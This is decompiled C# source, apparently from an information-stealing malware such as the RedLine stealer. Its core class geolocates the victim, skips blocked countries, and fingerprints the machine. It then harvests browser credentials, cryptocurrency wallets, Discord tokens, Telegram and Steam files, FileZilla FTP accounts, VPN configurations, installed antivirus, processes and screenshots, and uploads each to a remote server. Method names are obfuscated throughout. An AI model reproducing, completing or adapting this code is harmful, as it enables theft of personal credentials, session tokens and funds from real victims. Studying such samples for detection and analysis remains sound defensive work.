using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.CSharp.RuntimeBinder;

// Token: 0x0200002C RID: 44
public static class ResFac
{
	// Token: 0x060000DE RID: 222 RVA: 0x00009008 File Offset: 0x00007208
	static ResFac()
	{
		Random rnd = new Random();
		ResFac.Actions = (from x in ResFac.Actions
		orderby rnd.Next()
		select x).ToArray<ResFac.ParsSt>();
		ResFac.PreStageActions = (from x in ResFac.PreStageActions
		orderby rnd.Next()
		select x).ToArray<ResFac.ParsSt>();
	}

	// Token: 0x060000DF RID: 223 RVA: 0x000091C0 File Offset: 0x000073C0
	public static bool sdf9j3nasd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		bool result2;
		try
		{
			result.ScanDetails = new ScanDetails
			{
				AvailableLanguages = new List<string>(),
				Browsers = new List<Browser>(),
				FtpConnections = new List<Account>(),
				GameChatFiles = new List<ScannedFile>(),
				GameLauncherFiles = new List<ScannedFile>(),
				InstalledBrowsers = new List<BrowserVersion>(),
				MessageClientFiles = new List<ScannedFile>(),
				NordAccounts = new List<Account>(),
				Open = new List<ScannedFile>(),
				Processes = new List<string>(),
				Proton = new List<ScannedFile>(),
				ScannedFiles = new List<ScannedFile>(),
				ScannedWallets = new List<ScannedFile>(),
				SecurityUtils = new List<string>(),
				Softwares = new List<string>(),
				SystemHardwares = new List<SystemHardware>()
			};
			ResFac.dsf9jb(settings, ref result);
			result.SeenBefore = Program.SeenBefore();
			result.ReplaceEmptyValues();
			foreach (ResFac.ParsSt parsSt in ResFac.PreStageActions)
			{
				try
				{
					parsSt(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception)
				{
				}
			}
			if (connection.TryInit(result) != ApiResponse.Success)
			{
				throw new InvalidOperationException();
			}
			ResFac.LSIDsd2(connection, settings, ref result);
			result2 = true;
		}
		catch (InvalidOperationException ex2)
		{
			throw ex2;
		}
		catch (Exception)
		{
			result2 = false;
		}
		return result2;
	}

	// Token: 0x060000E0 RID: 224 RVA: 0x00006A50 File Offset: 0x00004C50
	public static void dsf9jb(ScanningArgs settings, ref ScanResult result)
	{
		GeoInfo geoInfo = LocatorAPI.Gather();
		geoInfo.IP = (string.IsNullOrWhiteSpace(geoInfo.IP) ? "UNKNOWN" : geoInfo.IP);
		geoInfo.Location = (string.IsNullOrWhiteSpace(geoInfo.Location) ? "UNKNOWN" : geoInfo.Location);
		geoInfo.Country = (string.IsNullOrWhiteSpace(geoInfo.Country) ? "UNKNOWN" : geoInfo.Country);
		geoInfo.PostalCode = (string.IsNullOrWhiteSpace(geoInfo.PostalCode) ? "UNKNOWN" : geoInfo.PostalCode);
		List<string> blockedCountry = settings.BlockedCountry;
		if (blockedCountry != null && blockedCountry.Count > 0 && settings.BlockedCountry.Contains(geoInfo.Country))
		{
			Environment.Exit(0);
		}
		List<string> blockedIP = settings.BlockedIP;
		if (blockedIP != null && blockedIP.Count > 0 && settings.BlockedIP.Contains(geoInfo.IP))
		{
			Environment.Exit(0);
		}
		result.IPv4 = geoInfo.IP;
		result.City = geoInfo.Location;
		result.Country = geoInfo.Country;
		result.ZipCode = geoInfo.PostalCode;
	}

	// Token: 0x060000E1 RID: 225 RVA: 0x0000935C File Offset: 0x0000755C
	public static bool LSIDsd2(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		bool result2;
		try
		{
			foreach (ResFac.ParsSt parsSt in ResFac.Actions)
			{
				try
				{
					parsSt(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception)
				{
				}
			}
			result2 = true;
		}
		catch (InvalidOperationException ex2)
		{
			throw ex2;
		}
		catch (Exception)
		{
			result2 = false;
		}
		return result2;
	}

	// Token: 0x060000E2 RID: 226 RVA: 0x000033EA File Offset: 0x000015EA
	public static void asdkadu8(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.Hardware = CryptoHelper.GetMd5Hash(Environment.UserDomainName + Environment.UserName + SystemInfoHelper.GetSerialNumber()).Replace("-", string.Empty);
	}

	// Token: 0x060000E3 RID: 227 RVA: 0x0000341A File Offset: 0x0000161A
	public static void sdfo8n234(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.FileLocation = Assembly.GetExecutingAssembly().Location;
	}

	// Token: 0x060000E4 RID: 228 RVA: 0x0000342C File Offset: 0x0000162C
	public static void sdfi35sdf(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.Language = InputLanguage.CurrentInputLanguage.Culture.EnglishName;
		result.OSVersion = SystemInfoHelper.GetWindowsVersion();
	}

	// Token: 0x060000E5 RID: 229 RVA: 0x000093D0 File Offset: 0x000075D0
	public static void asd44123(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (ResFac.<>o__8.<>p__1 == null)
		{
			ResFac.<>o__8.<>p__1 = CallSite<Func<CallSite, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(ResFac)));
		}
		Func<CallSite, object, string> target = ResFac.<>o__8.<>p__1.Target;
		CallSite <>p__ = ResFac.<>o__8.<>p__1;
		if (ResFac.<>o__8.<>p__0 == null)
		{
			ResFac.<>o__8.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.InvokeMember(CSharpBinderFlags.None, "ToString", null, typeof(ResFac), new CSharpArgumentInfo[]
			{
				CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
			}));
		}
		result.Resolution = target(<>p__, ResFac.<>o__8.<>p__0.Target(ResFac.<>o__8.<>p__0, Resolution.MonitorSize()));
	}

	// Token: 0x060000E6 RID: 230 RVA: 0x0000344E File Offset: 0x0000164E
	public static void fdfg9i3jn4(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.TZ = TimeZoneInfo.Local.DisplayName;
	}

	// Token: 0x060000E7 RID: 231 RVA: 0x00003460 File Offset: 0x00001660
	public static void sdf934asd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.MachineName = Environment.UserName;
	}

	// Token: 0x060000E8 RID: 232 RVA: 0x00009474 File Offset: 0x00007674
	public static void asdk9345asd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		List<SystemHardware> list = new List<SystemHardware>();
		foreach (SystemHardware item in SystemInfoHelper.GetProcessors())
		{
			list.Add(item);
		}
		foreach (SystemHardware item2 in SystemInfoHelper.GetGraphicCards())
		{
			list.Add(item2);
		}
		list.Add(new SystemHardware
		{
			Name = "Total of RAM",
			HardType = HardwareType.Graphic,
			Counter = SystemInfoHelper.TotalOfRAM()
		});
		ApiResponse apiResponse = connection.TryInitHardwares(list);
		if (apiResponse == ApiResponse.RepeatPart)
		{
			ResFac.asdk9345asd(connection, settings, ref result);
		}
		if (apiResponse == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x060000E9 RID: 233 RVA: 0x00003974 File Offset: 0x00001B74
	public static void asdk8jasd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		ApiResponse apiResponse = connection.TryInitInstalledBrowsers(SystemInfoHelper.GetBrowsers());
		if (apiResponse == ApiResponse.RepeatPart)
		{
			ResFac.asdk8jasd(connection, settings, ref result);
		}
		if (apiResponse == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x060000EA RID: 234 RVA: 0x00003996 File Offset: 0x00001B96
	public static void ылв92р34выа(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		ApiResponse apiResponse = connection.TryInitInstalledSoftwares(SystemInfoHelper.ListOfPrograms());
		if (apiResponse == ApiResponse.RepeatPart)
		{
			ResFac.ылв92р34выа(connection, settings, ref result);
		}
		if (apiResponse == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x060000EB RID: 235 RVA: 0x000039B8 File Offset: 0x00001BB8
	public static void аловй(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		List<string> vs = SystemInfoHelper.GetVs();
		ApiResponse apiResponse = connection.TryInitDefenders((vs != null) ? vs.ToList<string>() : null);
		if (apiResponse == ApiResponse.RepeatPart)
		{
			ResFac.аловй(connection, settings, ref result);
		}
		if (apiResponse == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x060000EC RID: 236 RVA: 0x000039E6 File Offset: 0x00001BE6
	public static void ыал8р45(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		ApiResponse apiResponse = connection.TryInitProcesses(SystemInfoHelper.ListOfProcesses());
		if (apiResponse == ApiResponse.RepeatPart)
		{
			ResFac.ыал8р45(connection, settings, ref result);
		}
		if (apiResponse == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x060000ED RID: 237 RVA: 0x00003A08 File Offset: 0x00001C08
	public static void ываш9р34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		ApiResponse apiResponse = connection.TryInitLanguages(SystemInfoHelper.AvailableLanguages());
		if (apiResponse == ApiResponse.RepeatPart)
		{
			ResFac.ываш9р34(connection, settings, ref result);
		}
		if (apiResponse == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x060000EE RID: 238 RVA: 0x00003A2A File Offset: 0x00001C2A
	public static void длвап9345(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanScreen)
		{
			ApiResponse apiResponse = connection.TryInitDisplay(Resolution.Print());
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ResFac.длвап9345(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x060000EF RID: 239 RVA: 0x00009560 File Offset: 0x00007760
	public static void ывал8н34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanTelegram)
		{
			List<ScannedFile> result2 = FileScanning.Search(new FileScanner[]
			{
				new DesktopMessanger()
			});
			ApiResponse apiResponse = connection.TryInitTelegramFiles(result2);
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ResFac.ывал8н34(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x060000F0 RID: 240 RVA: 0x000095A8 File Offset: 0x000077A8
	public static void вал93тфыв(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanBrowsers)
		{
			List<Browser> list = new List<Browser>();
			list.AddRange(Chr_0_M_e.Scan(settings.ScanChromeBrowsersPaths));
			list.AddRange(g_E_c_к_0.TryFind(settings.ScanGeckoBrowsersPaths));
			ApiResponse apiResponse = connection.TryInitBrowsers(list);
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ResFac.вал93тфыв(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x060000F1 RID: 241 RVA: 0x00003A54 File Offset: 0x00001C54
	public static void вашу0л34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanFiles)
		{
			ApiResponse apiResponse = connection.TryInitScannedFiles(FileSearcher.Search(settings.ScanFilesPaths));
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ResFac.вашу0л34(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x060000F2 RID: 242 RVA: 0x00003A84 File Offset: 0x00001C84
	public static void навева(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanFTP)
		{
			ApiResponse apiResponse = connection.TryInitFtpConnections(FileZilla.Scan());
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ResFac.навева(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x060000F3 RID: 243 RVA: 0x00009604 File Offset: 0x00007804
	public static void ащы9р34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanWallets)
		{
			BrEx brEx = new BrEx();
			brEx.Init(settings.ScanChromeBrowsersPaths);
			List<ScannedFile> result2 = FileScanning.Search(new FileScanner[]
			{
				new Armory(),
				new Atomic(),
				new C_o1_n0_mи(),
				new EL3_K_Tr00M(),
				new Eth(),
				new E_x0_d_u_S(),
				new Guarda(),
				new Jx(),
				new mYDict(),
				new AllWallets(),
				new Binance(),
				brEx
			});
			ApiResponse apiResponse = connection.TryInitColdWallets(result2);
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ResFac.ащы9р34(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x060000F4 RID: 244 RVA: 0x00003AAE File Offset: 0x00001CAE
	public static void ыва83о4тфыв(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanDiscord)
		{
			IEnumerable<ScannedFile> tokens = Discord.GetTokens();
			ApiResponse apiResponse = connection.TryInitDiscord((tokens != null) ? tokens.ToList<ScannedFile>() : null);
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ResFac.ыва83о4тфыв(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x060000F5 RID: 245 RVA: 0x00003AE4 File Offset: 0x00001CE4
	public static void askd435(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanSteam)
		{
			ApiResponse apiResponse = connection.TryInitSteamFiles(FileScanning.Search(new FileScanner[]
			{
				new GameLauncher()
			}));
			if (apiResponse == ApiResponse.RepeatPart)
			{
				ResFac.askd435(connection, settings, ref result);
			}
			if (apiResponse == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x060000F6 RID: 246 RVA: 0x00006ED0 File Offset: 0x000050D0
	public static void sdi845sa(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanVPN)
		{
			connection.TryInitNordVPN(NordApp.Find());
			connection.TryInitOpenVPN(FileScanning.Search(new FileScanner[]
			{
				new OpenVPN()
			}));
			connection.TryInitProtonVPN(FileScanning.Search(new FileScanner[]
			{
				new ProtonVPN()
			}));
		}
	}

	// Token: 0x17000004 RID: 4
	// (get) Token: 0x060000F7 RID: 247 RVA: 0x00003B1C File Offset: 0x00001D1C
	// (set) Token: 0x060000F8 RID: 248 RVA: 0x00003B23 File Offset: 0x00001D23
	public static ResFac.ParsSt[] Actions { get; set; } = new ResFac.ParsSt[]
	{
		new ResFac.ParsSt(ResFac.asdk9345asd),
		new ResFac.ParsSt(ResFac.asdk8jasd),
		new ResFac.ParsSt(ResFac.ылв92р34выа),
		new ResFac.ParsSt(ResFac.аловй),
		new ResFac.ParsSt(ResFac.ыал8р45),
		new ResFac.ParsSt(ResFac.ываш9р34),
		new ResFac.ParsSt(ResFac.ывал8н34),
		new ResFac.ParsSt(ResFac.вал93тфыв),
		new ResFac.ParsSt(ResFac.вашу0л34),
		new ResFac.ParsSt(ResFac.навева),
		new ResFac.ParsSt(ResFac.ащы9р34),
		new ResFac.ParsSt(ResFac.ыва83о4тфыв),
		new ResFac.ParsSt(ResFac.askd435),
		new ResFac.ParsSt(ResFac.sdi845sa),
		new ResFac.ParsSt(ResFac.длвап9345)
	};

	// Token: 0x17000005 RID: 5
	// (get) Token: 0x060000F9 RID: 249 RVA: 0x00003B2B File Offset: 0x00001D2B
	// (set) Token: 0x060000FA RID: 250 RVA: 0x00003B32 File Offset: 0x00001D32
	public static ResFac.ParsSt[] PreStageActions { get; set; } = new ResFac.ParsSt[]
	{
		new ResFac.ParsSt(ResFac.sdf934asd),
		new ResFac.ParsSt(ResFac.asd44123),
		new ResFac.ParsSt(ResFac.sdfi35sdf),
		new ResFac.ParsSt(ResFac.sdfo8n234),
		new ResFac.ParsSt(ResFac.asdkadu8),
		new ResFac.ParsSt(ResFac.fdfg9i3jn4)
	};

	// Token: 0x0200002D RID: 45
	// (Invoke) Token: 0x060000FC RID: 252
	public delegate void ParsSt(EndpointConnection connection, ScanningArgs settings, ref ScanResult result);
}
